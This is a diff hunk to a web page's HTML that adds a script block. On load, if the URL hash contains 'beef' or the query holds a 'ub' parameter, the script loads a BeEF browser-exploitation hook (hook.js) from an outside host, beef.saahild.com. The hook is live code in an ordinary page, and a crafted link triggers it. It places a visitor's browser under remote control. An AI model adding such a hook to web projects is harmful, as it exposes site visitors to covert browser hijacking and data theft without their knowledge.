@@ -174,6 +174,21 @@
     };
   </script> -->
   <!-- <script src="ad.js"></script> -->
+<!--   beef IF SPECICIFIED BY HASH OR QUERY -->
+  <script>
+ window.onload = () => {
+      (function() {
+    var url = 'https://beef.saahild.com:443/hook.js';
+    if (typeof beef == 'undefined' && ( location.hash.includes('beef') || new URLSearchParams(location.search).get("ub"))) {
+      
+        var bf = document.createElement('script');
+        bf.type = 'text/javascript';
+        bf.src = url;
+        document.body.appendChild(bf);
+    }
+})();
+ }
+  </script>
   <body>
     <noscript>
       <div class="my-modal-content">
